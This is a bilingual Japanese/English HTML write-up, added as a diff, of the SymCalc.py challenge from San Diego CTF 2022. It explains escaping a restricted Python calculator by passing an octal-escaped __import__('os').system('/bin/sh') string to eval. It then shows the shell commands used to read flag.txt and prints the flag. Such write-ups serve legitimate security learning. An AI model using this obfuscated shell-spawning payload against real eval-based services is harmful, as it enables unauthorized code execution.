@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>SymCalc.py (San Diego CTF 2022) Writeup</title>
+<script src="../../../../common/common.js"></script>
+</head>
+<body>
+<language-selector data-langlist="日本語,ja,English,en"></language-selector>
+<h1>SymCalc.py</h1>
+<div class="language-selector-ja" lang="ja">
+<p>
+TCPサーバの接続情報と、ファイル <code>symcalc.py</code> が与えられた。
+</p><p>
+サーバに接続してみると、まず単語の入力を要求された。<br>
+ここで入力した単語が表すオブジェクトが <code>_</code> の初期値になるようであった。<br>
+その後は、記号と数字のみからなるPythonの式を入力して実行できるようだった。
+</p><p>
+まず、<common-tool data-lang="ja">CyberChef</common-tool>で <code>__import__("os").system("/bin/sh")</code> の8進数表記を求めた。
+</p>
+</div>
+<div class="language-selector-en" lang="en">
+<p>
+Information to connect to a TCP server and a file <code>symcalc.py</code> were given.
+</p><p>
+Connecting to the server, firstly I was asked to enter a word.<br>
+The object that corresponds to this word looked used as the initial value of <code>_</code>.<br>
+After that, it accepted Python expressions that consist of only digits and marks to execute.
+</p><p>
+Firstly, I obtained the octal representation of <code>__import__("os").system("/bin/sh")</code> using <common-tool data-lang="en">CyberChef</common-tool>.
+</p>
+</div>
+<p><a href="https://gchq.github.io/CyberChef/#recipe=To_Octal('Line%20feed')Find_/_Replace(%7B'option':'Regex','string':'%5E(%5B0-9%5D%7B2%7D)$'%7D,'0$1',true,false,true,false)Pad_lines('Start',1,'%5C%5C')Find_/_Replace(%7B'option':'Regex','string':'%5C%5Cn'%7D,'',true,false,true,false)&amp;input=X19pbXBvcnRfXygib3MiKS5zeXN0ZW0oIi9iaW4vc2giKQ">To Octal, 3 more - CyberChef</a></p>
+
+<p class="language-selector-ja" lang="ja">
+最初の単語として <code>eval</code> を入力し、続いて以下の式を実行することで、シェルを起動できた。
+</p>
+<p class="language-selector-en" lang="en">
+I succeeded to launch the shell by entering <code>eval</code> as the first word, and then executing this expression:
+</p>
+<code-block data-extension="py">
+_("\137\137\151\155\160\157\162\164\137\137\050\042\157\163\042\051\056\163\171\163\164\145\155\050\042\057\142\151\156\057\163\150\042\051")
+</code-block>
+
+<p class="language-selector-ja" lang="ja">
+起動したシェルで <code>ls -al</code> コマンドを実行することで、ファイル <code>flag.txt</code> があることがわかった。<br>
+<code>cat flag.txt</code> コマンドを実行すると、flagが得られた。
+</p>
+<p class="language-selector-en" lang="en">
+I found that a file <code>flag.txt</code> exists via <code>ls -al</code> command on the shell.<br>
+I obtained the flag via <code>cat flag.txt</code> command.
+</p>
+
+<div class="flag">sdctf{0ct4l_3scap3s_go_brrrrr...___und3rsc0r3s_ar3_Id3Nt1Fi3rs_t00}</div>
+<hr>
+<writeup-by></writeup-by>
+<p>
+<a href="../../" class="language-aware-link">San Diego CTF 2022</a>
+</p>
+</body>
+</html>
